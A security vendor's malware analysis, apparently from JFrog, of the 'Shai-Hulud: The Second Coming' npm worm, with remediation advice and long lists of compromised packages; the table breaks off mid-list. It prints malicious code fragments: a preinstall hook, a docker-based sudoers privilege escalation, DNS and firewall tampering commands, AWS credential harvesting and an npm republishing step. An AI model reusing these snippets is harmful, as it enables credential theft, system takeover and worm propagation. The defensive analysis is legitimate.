---
excerpt: Shai-Hulud ongoing attack resurfaced for a second wave, compromising more than 630 packages so far
title: Shai-Hulud, The Second Coming - Ongoing npm supply chain attack
date: "November 24, 2025"
description: "Guy Korolevski, Andrii Polkovnychenko and Shavit Satou, JFrog Security Researchers"
tag: "Real Time Post"
img: /img/RealTimePostImage/post_thumbnail1.png
type: realTimePost
minutes: '14'
schema:  |
   {
   "@context": "https://schema.org",
   "@type": "TechArticle",
   "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://research.jfrog.com/post/shai-hulud-the-second-coming/"
   },
   "headline": "Shai-Hulud, The Second Coming - Ongoing npm supply chain attack",
   "description": "Shai-Hulud ongoing attack resurfaced for a second wave, compromising more than 630 packages so far",
   "author": [
    {
      "@type": "Person",
      "name": "Guy Korolevski"
    },
    {
      "@type": "Person",
      "name": "Andrii Polkovnychenko"
    },
    {
      "@type": "Person",
      "name": "Shavit Satou"
    }
   ],
   "publisher": {
    "@type": "Organization",
    "@id":"https://jfrog.com/#organization",
    "name": "JFrog ",
    "logo": {
      "@type": "ImageObject",
      "url": "https://research.jfrog.com/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg"
    }
   },
   "datePublished": "2025-11-24",
   "dateModified": "2025-11-24"}
---

[In September](https://jfrog.com/blog/shai-hulud-npm-supply-chain-attack-new-compromised-packages-detected/), NPM faced one of its largest compromises, with many packages hijacked and millions of users compromised. Today, the strike was renewed with a new wave of compromised packages. In addition to the initial **459** publicly identified packages, the JFrog research team identified **337** additional compromised packages. The attack is still ongoing, encompassing more than 1000 compromised package versions. Despite the attack was targeted mainly at NPM repository, the malicious code was also found in a Maven package.

The final payload, similar to the first Shai-hulud attack, is a self-propagating worm that steals the user’s secrets, uploads them to a public GitHub repo, and repacks itself into all of the user's available NPM packages with the malicious payload. 

## Comparison to the previous Shai-Hulud attack

This time, a malicious payload was found on bun\_environment.js instead of bundle.js.  
The former Shai-hulud attack created repositories in GitHub with the exfiltrated credentials called \<user\>/shai-hulud, whereas this time the payload seems to generate a random repository name, containing the user’s secrets:  
![](/img/RealTimePostImage/post/shai-hulud-2-repos.png)
In the repository's description, you can see that this attack is called “**Sha1-Hulud: The Second Coming.”** By the attackers.  
![](/img/RealTimePostImage/post/shai-hulud-comp-repo.png)

## What to do if you are compromised?

Anyone who has one of the specified versions of the compromised packages should:

1. Rotate any access tokens that were stored on the affected machine of the following providers: GitHub, NPM, AWS, GCP, Azure  
2. Rotate any access tokens that were stored on the affected machine that TruffleHog can identify. Supported providers can be searched for in [Trufflehog’s GitHub repository](https://github.com/trufflesecurity/trufflehog/tree/main/pkg/detectors).  
3. If GitHub access tokens were stored on the affected machine, check the GitHub account for new repositories with a random name, containing one or several of the following files:  
   1. contents.json  
   2. environment.json  
   3. cloud.json  
   4. actionsSecrets.json  
   5. truffleSecrets.json  
4. If npm access tokens were stored on the affected machine, check the npm account for new versions of published packages that contain a postinstall script that runs "node setup\_bun.js.js". If found \- remove these versions

**📋 Need comprehensive guidance?** For detailed incident response procedures including containment, credential rotation, and prevention strategies, follow our **[5-Phase Shai-Hulud Response Guide](https://research.jfrog.com/post/shai-hulud-the-second-coming-remediation-guidance/)** with step-by-step instructions to secure your environment and prevent future attacks.

**JFrog [Xray](https://jfrog.com/xray/) and [Curation](https://jfrog.com/curation/) customers are fully protected from this attack vector, as all of the campaign's packages are already marked as malicious.**

In addition, for JFrog Curation customers - 

1. Consider enabling [Compliant Version Selection](https://jfrog.com/help/r/jfrog-security-user-guide/products/curation/configure-curation/fallback-behavior-for-blocked-packages) in order to keep developers safe without hurting their workflow. With CVS - the latest, non-malicious version of each package will be transparently served by Curation.
2. Consider enabling the [Package version is immature](https://jfrog.com/help/r/jfrog-security-user-guide/products/curation/configure-curation/create-policies/list-of-available-conditions) policy, in order to reject package versions which are too new. This will allow you to constantly stay immune to similar dependency hijack attacks.
3. Curation customers can utilize Catalog's new JFrog label, "Shai Hulud - The second coming", which enumerates all the compromised packages.
![](/img/RealTimePostImage/post/shai-hulud-v2-jfrog-catalog.png)

## Payload planted by the attacker

For compromised packages, inside the *package.json* file, the attacker added the auto-run:

```json


"scripts": {
   ....
   "preinstall": "node setup_bun.js"
 }
```

Inside the package's files, we found 2 more files \- setup\_bun.js and bun\_environment.js

## setup\_bun.js \- what does it do?

This script installs Bun (if missing) and then executes bun\_environment.js, which contains obfuscated code. The main function orchestrates installation and validation:

```javascript
async function main() {
  let bunExecutable;

  if (isBunOnPath()) {
    // Use bun from PATH
    bunExecutable = 'bun';
  } else {
    // Check if we have a locally downloaded bun
    const localBunDir = path.join(__dirname, 'bun-dist');
    const possiblePaths = [
      path.join(localBunDir, 'bun', 'bun'),
      path.join(localBunDir, 'bun', 'bun.exe'),
      path.join(localBunDir, 'bun.exe'),
      path.join(localBunDir, 'bun')
    ];

    const existingBun = possiblePaths.find(p => fs.existsSync(p));

    if (existingBun) {
      bunExecutable = existingBun;
    } else {
      // Download and setup bun
      bunExecutable = await downloadAndSetupBun();
    }
  }
```

Main function flow:

1. Checks if bun is on PATH, uses it if found  
2. If not found, checks for local bun in bun-dist/  
3. If still not found, downloads and installs Bun  
4. Executes bun\_environment.js if it exists  
5. Exits silently if the file is missing

## DNS hijacking

The affected system (if running systemd) will have its DNS hijacked, assuming that sudo can be used without specifying a password by attempting privilege escalation via Docker:

```javascript
async function pQ0() {
  try {
    let {
      stdout: _0x259d7f,
      exitCode: _0x2a341e
    } = await Bun.$`sudo -n true`.nothrow();
    return _0x2a341e === 0;
  } catch {
    try {
      await Bun.$`docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"`.nothrow();
    } catch {
      return false;
    }
    return true;
  }
}

async function gQ0() {
  await Bun.$`sudo systemctl stop systemd-resolved`.nothrow();
  await Bun.$`sudo cp /tmp/resolved.conf /etc/systemd/resolved.conf`.nothrow();
  await Bun.$`sudo systemctl restart systemd-resolved`.nothrow();
  await Bun.$`sudo iptables -t filter -F OUTPUT`.nothrow();
  await Bun.$`sudo iptables -t filter -F DOCKER-USER`.nothrow();
}
```

## 

## bun\_environment.js \- Attack flow

**Phase 1 \- Initialization and environment detection** \- checks CI/CD environment, looks up for GITHUB\_ACTIONS, CODEBUILD\_BUILD\_NUMBER, BUILDKITE and CIRCLE\_SHA1. If it runs in a CI/CD environment, it tries privilege escalation.

**Phase 2 \- Credentials harvesting**, which includes:

1. Github Token:  
   1. Searches for \- “ghp\_”, “gho\_”  
   2. Tries to authenticate using GitHub CLI (gh auth token)  
   3. Searches for infected repos in the user’s account  
2. NPM  
   1. NPM\_TOKEN env variable check  
   2. Read \~/.npmrc  
3. Cloud credentials  
   1. AWS (All regions)  
   2. GCP  
   3. Azure

```javascript
if (process.env.AWS_ACCESS_KEY_ID && process.env.AWS_SECRET_ACCESS_KEY) {
    return {
      accessKeyId: process.env.AWS_ACCESS_KEY_ID,
      secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
      token: process.env.AWS_SESSION_TOKEN
    };
}
```

 **Phase 3** \- **Repository Creation** The script creates a random repo, under the compromised user, with 18 random characters, containing the description "Sha1-Hulud: The Second Coming."  
Additionally, if the user has a workflow scope, it installs a self-hosted runner, hidden in $HOME/.dev-env and creates a workflow file.

```javascript
function generate_random_name() {
  return Array.from({
    length: 18
  }, () => Math.random().toString(36).slice(2, 3)).join("");
}

if (github.isAuthenticated()) {
  await github.createRepo(generate_random_name());
}
```

**Phase 4 \- Data exfiltration**

1. contents.json \- System information  
2. environment.json \- environment variables  
3. cloud.json \- cloud secrets   
4. actionsSecrets.json \- GitHub actions secrets  
5. truffleSecrets.json \- secrets detected by Trufflehog on home directory scanning

**Phase 5 \- Supply chain attack**  
On NPN \- The script finds **all** packages available in user data (up to 100), for each:

1. Downloads it  
2. Modify package.json with a preinstall command  
3. Bundle the payload together  
4. Version incrementation  
5. Repack  
6. Publish to NPM

```javascript
let tmp_dir = await Sy1(a0_0x459ea5.join(a0_0x647ad2.tmpdir(), "npm-update-"));
let tar_path = a0_0x459ea5.join(tmp_dir, "updated.tgz");
await Bun.$`npm publish ${tar_path}`.env({
    ...process.env,
    NPM_CONFIG_TOKEN: this.token
});
```

**Phase 6 \- Fallback**  
If the script could not find a GitHub token and did not find any NPM token, it shows destructive behaviour:

1. Windows \- Deletion of all user data  
2. Unix \- shred all files and delete empty directories

But, if it did find a token, it exits clean

## Packages initially revealed by JFrog as compromised

```
@accordproject/concerto-linter
@accordproject/concerto-linter-default-ruleset
@accordproject/concerto-metamodel
@accordproject/concerto-types
@accordproject/template-engine
@alaan/s2s-auth
@antstackio/eslint-config-antstack
@antstackio/express-graphql-proxy
@antstackio/graphql-body-parser
@antstackio/json-to-graphql
@antstackio/shelbysam
@clausehq/flows-step-httprequest
@clausehq/flows-step-mqtt
@clausehq/flows-step-taskscreateurl
@commute/market-data-chartjs
@dev-blinq/blinqioclient
@dev-blinq/cucumber-js
@dev-blinq/ui-systems
@everreal/react-charts
@everreal/validate-esmoduleinterop-imports
@faq-component/core
@faq-component/react
@fishingbooker/react-loader
@fishingbooker/react-pagination
@fishingbooker/react-raty
@hover-design/core
@hover-design/react
@ifings/metatron3
@lessondesk/electron-group-api-client
@lessondesk/material-icons
@lessondesk/react-table-context
@mparpaillon/page
@ntnx/passport-wso2
@ntnx/t
@osmanekrem/bmad
@pradhumngautam/common-app
@pruthvi21/use-debounce
@relyt/claude-context-core
@relyt/claude-context-mcp
@relyt/mcp-server-relytone
@seezo/sdr-mcp-server
@sme-ui/aoma-vevasound-metadata-lib
@suraj_h/medium-common
@trpc-rate-limiter/cloudflare
@trpc-rate-limiter/hono
@varsityvibe/utils
@voiceflow/alexa-types
@voiceflow/anthropic
@voiceflow/api-sdk
@voiceflow/backend-utils
@voiceflow/base-types
@voiceflow/body-parser
@voiceflow/chat-types
@voiceflow/circleci-config-sdk-orb-import
@voiceflow/commitlint-config
@voiceflow/common
@voiceflow/default-prompt-wrappers
@voiceflow/dependency-cruiser-config
@voiceflow/dtos-interact
@voiceflow/encryption
@voiceflow/eslint-config
@voiceflow/eslint-plugin
@voiceflow/exception
@voiceflow/fetch
@voiceflow/general-types
@voiceflow/git-branch-check
@voiceflow/google-dfes-types
@voiceflow/google-types
@voiceflow/husky-config
@voiceflow/logger
@voiceflow/metrics
@voiceflow/natural-language-commander
@voiceflow/nestjs-common
@voiceflow/nestjs-mongodb
@voiceflow/nestjs-rate-limit
@voiceflow/nestjs-redis
@voiceflow/nestjs-timeout
@voiceflow/npm-package-json-lint-config
@voiceflow/openai
@voiceflow/pino
@voiceflow/pino-pretty
@voiceflow/prettier-config
@voiceflow/react-chat
@voiceflow/runtime
@voiceflow/runtime-client-js
@voiceflow/sdk-runtime
@voiceflow/secrets-provider
@voiceflow/semantic-release-config
@voiceflow/serverless-plugin-typescript
@voiceflow/slate-serializer
@voiceflow/stitches-react
@voiceflow/storybook-config
@voiceflow/stylelint-config
@voiceflow/test-common
@voiceflow/tsconfig
@voiceflow/tsconfig-paths
@voiceflow/utils-designer
@voiceflow/verror
@voiceflow/vite-config
@voiceflow/vitest-config
@voiceflow/voice-types
@voiceflow/voiceflow-types
@voiceflow/widget
02-echo
ai-crowl-shield
arc-cli-fc
automation_model
benmostyn-frame-print
bidirectional-adapter
blob-to-base64
colors-regex
composite-reducer
css-dedoupe
dashboard-empty-state
dialogflow-es
docusaurus-plugin-vanilla-extract
dont-go
email-deliverability-tester
eslint-config-nitpicky
expressos
fat-fingered
firestore-search-engine
generator-meteor-stock
generator-ng-itobuz
gulp-inject-envs
hover-design-prototype
httpness
hyper-fullfacing
itobuz-angular-button
jsonsurge
kwami
lang-codes
mod10-check-digit
n8n-nodes-vercel-ai-sdk
n8n-nodes-viral-app
next-simple-google-analytics
next-styled-nprogress
ngx-useful-swiper-prosenjit
ngx-wooapi
normal-store
orchestrix
package-tester
pdf-annotation
pkg-readme
prime-one-table
prompt-eng
prompt-eng-server
puny-req
ra-auth-firebase
react-favic
react-hook-form-persist
react-linear-loader
react-micromodal.js
react-native-google-maps-directions
react-native-modest-checkbox
react-native-modest-storage
samesame
selenium-session
selenium-session-client
shelf-jwt-sessions
solomon-api-stories
solomon-v3-stories
solomon-v3-ui-wrapper
south-african-id-info
stat-fns
super-commit
svelte-toasty
tanstack-shadcn-table
tcsp
tcsp-test-vd
template-lib
template-micro-service
tiaan
typefence
upload-to-play-store
use-unsaved-changes
valid-south-african-id
vf-oss-template
web-scraper-mcp
wellness-expert-ng-gallery
zuper-stream
```



## Full list of compromised packages (ongoing)

We’re continuing to track the unfolding compromise of more packages in this campaign. In addition to packages added from public sources, our monitoring infrastructure has detected additional malicious packages with the same payload (or variations of it):

[Download the list in CSV format](/shai_hulud_2_packages.csv)

| package_name                                                | versions                            |
| ----------------------------------------------------------- | ----------------------------------- |
| 02-echo                                                     | [0.0.7]                             |
| @accordproject/concerto-analysis                            | [3.24.1]                            |
| @accordproject/concerto-linter                              | [3.24.1]                            |
| @accordproject/concerto-linter-default-ruleset              | [3.24.1]                            |
| @accordproject/concerto-metamodel                           | [3.12.5]                            |
| @accordproject/concerto-types                               | [3.24.1]                            |
| @accordproject/markdown-it-cicero                           | [0.16.26]                           |
| @accordproject/template-engine                              | [2.7.2]                             |
| @actbase/css-to-react-native-transform                      | [1.0.3]                             |
| @actbase/native                                             | [0.1.32]                            |
| @actbase/node-server                                        | [1.1.19]                            |
| @actbase/react-absolute                                     | [0.8.3]                             |
| @actbase/react-daum-postcode                                | [1.0.5]                             |
| @actbase/react-kakaosdk                                     | [0.9.27]                            |
| @actbase/react-native-actionsheet                           | [1.0.3]                             |
| @actbase/react-native-devtools                              | [0.1.3]                             |
| @actbase/react-native-fast-image                            | [8.5.13]                            |
| @actbase/react-native-kakao-channel                         | [1.0.2]                             |
| @actbase/react-native-kakao-navi                            | [2.0.4]                             |
| @actbase/react-native-less-transformer                      | [1.0.6]                             |
| @actbase/react-native-naver-login                           | [1.0.1]                             |
| @actbase/react-native-simple-video                          | [1.0.13]                            |
| @actbase/react-native-tiktok                                | [1.1.3]                             |
| @afetcan/api                                                | [0.0.13]                            |
| @afetcan/storage                                            | [0.0.27]                            |
| @alaan/s2s-auth                                             | [2.0.3]                             |
| @alexadark/amadeus-api                                      | [1.0.4]                             |
| @alexadark/gatsby-theme-events                              | [1.0.1]                             |
| @alexadark/gatsby-theme-wordpress-blog                      | [2.0.1]                             |
| @alexadark/reusable-functions                               | [1.5.1]                             |
| @alexcolls/nuxt-socket.io                                   | [0.0.7],[0.0.8]                     |
| @alexcolls/nuxt-ux                                          | [0.6.1],[0.6.2]                     |
| @antstackio/eslint-config-antstack                          | [0.0.3]                             |
| @antstackio/express-graphql-proxy                           | [0.2.8]                             |
| @antstackio/graphql-body-parser                             | [0.1.1]                             |
| @antstackio/json-to-graphql                                 | [1.0.3]                             |
| @antstackio/shelbysam                                       | [1.1.7]                             |
| @aryanhussain/my-angular-lib                                | [0.0.23]                            |
| @asyncapi/avro-schema-parser                                | [3.0.25],[3.0.26]                   |
| @asyncapi/bundler                                           | [0.6.5],[0.6.6]                     |
| @asyncapi/cli                                               | [4.1.2],[4.1.3]                     |
| @asyncapi/converter                                         | [1.6.3],[1.6.4]                     |
| @asyncapi/diff                                              | [0.5.1],[0.5.2]                     |
| @asyncapi/dotnet-rabbitmq-template                          | [1.0.1],[1.0.2]                     |
| @asyncapi/edavisualiser                                     | [1.2.1],[1.2.2]                     |
| @asyncapi/generator                                         | [2.8.5],[2.8.6]                     |
| @asyncapi/generator-components                              | [0.3.2],[0.3.3]                     |
| @asyncapi/generator-helpers                                 | [0.2.1],[0.2.2]                     |
| @asyncapi/generator-react-sdk                               | [1.1.4],[1.1.5]                     |
| @asyncapi/go-watermill-template                             | [0.2.76],[0.2.77]                   |
| @asyncapi/html-template                                     | [3.3.2],[3.3.3]                     |
| @asyncapi/java-spring-cloud-stream-template                 | [0.13.5],[0.13.6]                   |
| @asyncapi/java-spring-template                              | [1.6.1],[1.6.2]                     |
| @asyncapi/java-template                                     | [0.3.5],[0.3.6]                     |
| @asyncapi/keeper                                            | [0.0.2],[0.0.3]                     |
| @asyncapi/markdown-template                                 | [1.6.8],[1.6.9]                     |
| @asyncapi/modelina                                          | [5.10.2],[5.10.3]                   |
| @asyncapi/modelina-cli                                      | [5.10.2],[5.10.3]                   |
| @asyncapi/multi-parser                                      | [2.2.1],[2.2.2]                     |
| @asyncapi/nodejs-template                                   | [3.0.5],[3.0.6]                     |
| @asyncapi/nodejs-ws-template                                | [0.10.1],[0.10.2]                   |
| @asyncapi/nunjucks-filters                                  | [2.1.1],[2.1.2]                     |
| @asyncapi/openapi-schema-parser                             | [3.0.25],[3.0.26]                   |
| @asyncapi/optimizer                                         | [1.0.5],[1.0.6]                     |
| @asyncapi/parser                                            | [3.4.1],[3.4.2]                     |
| @asyncapi/php-template                                      | [0.1.1],[0.1.2]                     |
| @asyncapi/problem                                           | [1.0.1],[1.0.2]                     |
| @asyncapi/protobuf-schema-parser                            | [3.5.2],[3.5.3],[3.6.1]             |
| @asyncapi/python-paho-template                              | [0.2.14],[0.2.15]                   |
| @asyncapi/react-component                                   | [2.6.6],[2.6.7]                     |
| @asyncapi/server-api                                        | [0.16.24],[0.16.25]                 |
| @asyncapi/specs                                             | [6.10.1],[6.8.2],[6.8.3],[6.9.1]    |
| @asyncapi/studio                                            | [1.0.2],[1.0.3]                     |
| @asyncapi/web-component                                     | [2.6.6],[2.6.7]                     |
| @bdkinc/knex-ibmi                                           | [0.5.7]                             |
| @browserbasehq/bb9                                          | [1.2.21]                            |
| @browserbasehq/director-ai                                  | [1.0.3]                             |
| @browserbasehq/mcp                                          | [2.1.1]                             |
| @browserbasehq/mcp-server-browserbase                       | [2.4.2]                             |
| @browserbasehq/sdk-functions                                | [0.0.4]                             |
| @browserbasehq/stagehand                                    | [3.0.4]                             |
| @browserbasehq/stagehand-docs                               | [1.0.1]                             |
| @caretive/caret-cli                                         | [0.0.2]                             |
| @chtijs/eslint-config                                       | [1.0.1]                             |
| @clausehq/flows-step-httprequest                            | [0.1.14]                            |
| @clausehq/flows-step-jsontoxml                              | [0.1.14]                            |
| @clausehq/flows-step-mqtt                                   | [0.1.14]                            |
| @clausehq/flows-step-sendgridemail                          | [0.1.14]                            |
| @clausehq/flows-step-taskscreateurl                         | [0.1.14]                            |
| @cllbk/ghl                                                  | [1.3.1]                             |
| @commute/bloom                                              | [1.0.3]                             |
| @commute/market-data                                        | [1.0.2]                             |
| @commute/market-data-chartjs                                | [2.3.1]                             |
| @dev-blinq/ai-qa-logic                                      | [1.0.19]                            |
| @dev-blinq/blinqioclient                                    | [1.0.21]                            |
| @dev-blinq/cucumber-js                                      | [1.0.131]                           |
| @dev-blinq/cucumber_client                                  | [1.0.738]                           |
| @dev-blinq/ui-systems                                       | [1.0.93]                            |
| @ensdomains/address-encoder                                 | [1.1.5]                             |
| @ensdomains/blacklist                                       | [1.0.1]                             |
| @ensdomains/buffer                                          | [0.1.2]                             |
| @ensdomains/ccip-read-cf-worker                             | [0.0.4]                             |
| @ensdomains/ccip-read-dns-gateway                           | [0.1.1]                             |
| @ensdomains/ccip-read-router                                | [0.0.7]                             |
| @ensdomains/ccip-read-worker-viem                           | [0.0.4]                             |
| @ensdomains/content-hash                                    | [3.0.1]                             |
| @ensdomains/curvearithmetics                                | [1.0.1]                             |
| @ensdomains/cypress-metamask                                | [1.2.1]                             |
| @ensdomains/dnsprovejs                                      | [0.5.3]                             |
| @ensdomains/dnssec-oracle-anchors                           | [0.0.2]                             |
| @ensdomains/dnssecoraclejs                                  | [0.2.9]                             |
| @ensdomains/durin                                           | [0.1.2]                             |
| @ensdomains/durin-middleware                                | [0.0.2]                             |
| @ensdomains/ens-archived-contracts                          | [0.0.3]                             |
| @ensdomains/ens-avatar                                      | [1.0.4]                             |
| @ensdomains/ens-contracts                                   | [1.6.1]                             |
| @ensdomains/ens-test-env                                    | [1.0.2]                             |
| @ensdomains/ens-validation                                  | [0.1.1]                             |
| @ensdomains/ensjs                                           | [4.0.3]                             |
| @ensdomains/ensjs-react                                     | [0.0.5]                             |
| @ensdomains/eth-ens-namehash                                | [2.0.16]                            |
| @ensdomains/hackathon-registrar                             | [1.0.5]                             |
| @ensdomains/hardhat-chai-matchers-viem                      | [0.1.15]                            |
| @ensdomains/hardhat-toolbox-viem-extended                   | [0.0.6]                             |
| @ensdomains/mock                                            | [2.1.52]                            |
| @ensdomains/name-wrapper                                    | [1.0.1]                             |
| @ensdomains/offchain-resolver-contracts                     | [0.2.2]                             |
| @ensdomains/op-resolver-contracts                           | [0.0.2]                             |
| @ensdomains/react-ens-address                               | [0.0.32]                            |
| @ensdomains/renewal                                         | [0.0.13]                            |
| @ensdomains/renewal-widget                                  | [0.1.10]                            |
| @ensdomains/reverse-records                                 | [1.0.1]                             |
| @ensdomains/server-analytics                                | [0.0.2]                             |
| @ensdomains/solsha1                                         | [0.0.4]                             |
| @ensdomains/subdomain-registrar                             | [0.2.4]                             |
| @ensdomains/test-utils                                      | [1.3.1]                             |
| @ensdomains/thorin                                          | [0.6.51]                            |
| @ensdomains/ui                                              | [3.4.6]                             |
| @ensdomains/unicode-confusables                             | [0.1.1]                             |
| @ensdomains/unruggable-gateways                             | [0.0.3]                             |
| @ensdomains/vite-plugin-i18next-loader                      | [4.0.4]                             |
| @ensdomains/web3modal                                       | [1.10.2]                            |
| @everreal/react-charts                                      | [2.0.1],[2.0.2]                     |
| @everreal/validate-esmoduleinterop-imports                  | [1.4.4],[1.4.5]                     |
| @everreal/web-analytics                                     | [0.0.1],[0.0.2]                     |
| @faq-component/core                                         | [0.0.4]                             |
| @faq-component/react                                        | [1.0.1]                             |
| @fishingbooker/browser-sync-plugin                          | [1.0.5]                             |
| @fishingbooker/react-loader                                 | [1.0.7]                             |
| @fishingbooker/react-pagination                             | [2.0.6]                             |
| @fishingbooker/react-raty                                   | [2.0.1]                             |
| @fishingbooker/react-swiper                                 | [0.1.5]                             |
| @hapheus/n8n-nodes-pgp                                      | [1.5.1]                             |
| @hover-design/core                                          | [0.0.1]                             |
| @hover-design/react                                         | [0.2.1]                             |
| @huntersofbook/auth-vue                                     | [0.4.2]                             |
| @huntersofbook/core                                         | [0.5.1]                             |
| @huntersofbook/core-nuxt                                    | [0.4.2]                             |
| @huntersofbook/form-naiveui                                 | [0.5.1]                             |
| @huntersofbook/i18n                                         | [0.8.2]                             |
| @huntersofbook/ui                                           | [0.5.1]                             |
| @hyperlook/telemetry-sdk                                    | [1.0.19]                            |
| @ifelsedeveloper/protocol-contracts-svm-idl                 | [0.1.2],[0.1.3]                     |
| @ifings/design-system                                       | [4.9.2]                             |
| @ifings/metatron3                                           | [0.1.5]                             |
| @jayeshsadhwani/telemetry-sdk                               | [1.0.14]                            |
| @kvytech/cli                                                | [0.0.7]                             |
| @kvytech/components                                         | [0.0.2]                             |
| @kvytech/habbit-e2e-test                                    | [0.0.2]                             |
| @kvytech/medusa-plugin-announcement                         | [0.0.8]                             |
| @kvytech/medusa-plugin-management                           | [0.0.5]                             |
| @kvytech/medusa-plugin-newsletter                           | [0.0.5]                             |
| @kvytech/medusa-plugin-product-reviews                      | [0.0.9]                             |
| @kvytech/medusa-plugin-promotion                            | [0.0.2]                             |
| @kvytech/web                                                | [0.0.2]                             |
| @lessondesk/api-client                                      | [9.12.2],[9.12.3]                   |
| @lessondesk/babel-preset                                    | [1.0.1]                             |
| @lessondesk/electron-group-api-client                       | [1.0.3]                             |
| @lessondesk/eslint-config                                   | [1.4.2]                             |
| @lessondesk/material-icons                                  | [1.0.3]                             |
| @lessondesk/react-table-context                             | [2.0.4]                             |
| @lessondesk/schoolbus                                       | [5.2.2],[5.2.3]                     |
| @livecms/live-edit                                          | [0.0.32]                            |
| @livecms/nuxt-live-edit                                     | [1.9.2]                             |
| @lokeswari-satyanarayanan/rn-zustand-expo-template          | [1.0.9]                             |
| @louisle2/core                                              | [1.0.1]                             |
| @louisle2/cortex-js                                         | [0.1.6]                             |
| @lpdjs/firestore-repo-service                               | [1.0.1]                             |
| @lui-ui/lui-nuxt                                            | [0.1.1]                             |
| @lui-ui/lui-tailwindcss                                     | [0.1.2]                             |
| @lui-ui/lui-vue                                             | [1.0.13]                            |
| @markvivanco/app-version-checker                            | [1.0.1],[1.0.2]                     |
| @mcp-use/cli                                                | [2.2.6],[2.2.7]                     |
| @mcp-use/inspector                                          | [0.6.2],[0.6.3]                     |
| @mcp-use/mcp-use                                            | [1.0.1],[1.0.2]                     |
| @mparpaillon/connector-parse                                | [1.0.1]                             |
| @mparpaillon/imagesloaded                                   | [4.1.2]                             |
| @mparpaillon/page                                           | [1.0.1]                             |
| @ntnx/passport-wso2                                         | [0.0.3]                             |
| @ntnx/t                                                     | [0.0.101]                           |
| @oku-ui/accordion                                           | [0.6.2]                             |
| @oku-ui/alert-dialog                                        | [0.6.2]                             |
| @oku-ui/arrow                                               | [0.6.2]                             |
| @oku-ui/aspect-ratio                                        | [0.6.2]                             |
| @oku-ui/avatar                                              | [0.6.2]                             |
| @oku-ui/checkbox                                            | [0.6.3]                             |
| @oku-ui/collapsible                                         | [0.6.2]                             |
| @oku-ui/collection                                          | [0.6.2]                             |
| @oku-ui/dialog                                              | [0.6.2]                             |
| @oku-ui/direction                                           | [0.6.2]                             |
| @oku-ui/dismissable-layer                                   | [0.6.2]                             |
| @oku-ui/focus-guards                                        | [0.6.2]                             |
| @oku-ui/focus-scope                                         | [0.6.2]                             |
| @oku-ui/hover-card                                          | [0.6.2]                             |
| @oku-ui/label                                               | [0.6.2]                             |
| @oku-ui/menu                                                | [0.6.2]                             |
| @oku-ui/motion                                              | [0.4.4]                             |
| @oku-ui/motion-nuxt                                         | [0.2.2]                             |
| @oku-ui/popover                                             | [0.6.2]                             |
| @oku-ui/popper                                              | [0.6.2]                             |
| @oku-ui/portal                                              | [0.6.2]                             |
| @oku-ui/presence                                            | [0.6.2]                             |
| @oku-ui/primitive                                           | [0.6.2]                             |
| @oku-ui/primitives                                          | [0.7.9]                             |
| @oku-ui/primitives-nuxt                                     | [0.3.1]                             |
| @oku-ui/progress                                            | [0.6.2]                             |
| @oku-ui/provide                                             | [0.6.2]                             |
| @oku-ui/radio-group                                         | [0.6.2]                             |
| @oku-ui/roving-focus                                        | [0.6.2]                             |
| @oku-ui/scroll-area                                         | [0.6.2]                             |
| @oku-ui/separator                                           | [0.6.2]                             |
| @oku-ui/slider                                              | [0.6.2]                             |
| @oku-ui/slot                                                | [0.6.2]                             |
| @oku-ui/switch                                              | [0.6.2]                             |
| @oku-ui/tabs                                                | [0.6.2]                             |
| @oku-ui/toast                                               | [0.6.2]                             |
| @oku-ui/toggle                                              | [0.6.2]                             |
| @oku-ui/toggle-group                                        | [0.6.2]                             |
| @oku-ui/toolbar                                             | [0.6.2]                             |
| @oku-ui/tooltip                                             | [0.6.2]                             |
| @oku-ui/use-composable                                      | [0.6.2]                             |
| @oku-ui/utils                                               | [0.6.2]                             |
| @oku-ui/visually-hidden                                     | [0.6.2]                             |
| @orbitgtbelgium/mapbox-gl-draw-cut-polygon-mode             | [2.0.5]                             |
| @orbitgtbelgium/mapbox-gl-draw-scale-rotate-mode            | [1.1.1]                             |
| @orbitgtbelgium/orbit-components                            | [1.2.9]                             |
| @orbitgtbelgium/time-slider                                 | [1.0.187]                           |
| @osmanekrem/bmad                                            | [1.0.6]                             |
| @osmanekrem/error-handler                                   | [1.2.2]                             |
| @pergel/cli                                                 | [0.11.1]                            |
| @pergel/module-box                                          | [0.6.1]                             |
| @pergel/module-graphql                                      | [0.6.1]                             |
| @pergel/module-ui                                           | [0.0.9]                             |
| @pergel/nuxt                                                | [0.25.5]                            |
| @posthog/agent                                              | [1.24.1]                            |
| @posthog/ai                                                 | [7.1.2]                             |
| @posthog/automatic-cohorts-plugin                           | [0.0.8]                             |
| @posthog/bitbucket-release-tracker                          | [0.0.8]                             |
| @posthog/cli                                                | [0.5.15]                            |
| @posthog/clickhouse                                         | [1.7.1]                             |
| @posthog/core                                               | [1.5.6]                             |
| @posthog/currency-normalization-plugin                      | [0.0.8]                             |
| @posthog/customerio-plugin                                  | [0.0.8]                             |
| @posthog/databricks-plugin                                  | [0.0.8]                             |
| @posthog/drop-events-on-property-plugin                     | [0.0.8]                             |
| @posthog/event-sequence-timer-plugin                        | [0.0.8]                             |
| @posthog/filter-out-plugin                                  | [0.0.8]                             |
| @posthog/first-time-event-tracker                           | [0.0.8]                             |
| @posthog/geoip-plugin                                       | [0.0.8]                             |
| @posthog/github-release-tracking-plugin                     | [0.0.8]                             |
| @posthog/gitub-star-sync-plugin                             | [0.0.8]                             |
| @posthog/heartbeat-plugin                                   | [0.0.8]                             |
| @posthog/hedgehog-mode                                      | [0.0.42]                            |
| @posthog/icons                                              | [0.36.1]                            |
| @posthog/ingestion-alert-plugin                             | [0.0.8]                             |
| @posthog/intercom-plugin                                    | [0.0.8]                             |
| @posthog/kinesis-plugin                                     | [0.0.8]                             |
| @posthog/laudspeaker-plugin                                 | [0.0.8]                             |
| @posthog/lemon-ui                                           | [0.0.1]                             |
| @posthog/maxmind-plugin                                     | [0.1.6]                             |
| @posthog/migrator3000-plugin                                | [0.0.8]                             |
| @posthog/netdata-event-processing                           | [0.0.8]                             |
| @posthog/nextjs                                             | [0.0.3]                             |
| @posthog/nextjs-config                                      | [1.5.1]                             |
| @posthog/nuxt                                               | [1.2.9]                             |
| @posthog/pagerduty-plugin                                   | [0.0.8]                             |
| @posthog/piscina                                            | [3.2.1]                             |
| @posthog/plugin-contrib                                     | [0.0.6]                             |
| @posthog/plugin-server                                      | [1.10.8]                            |
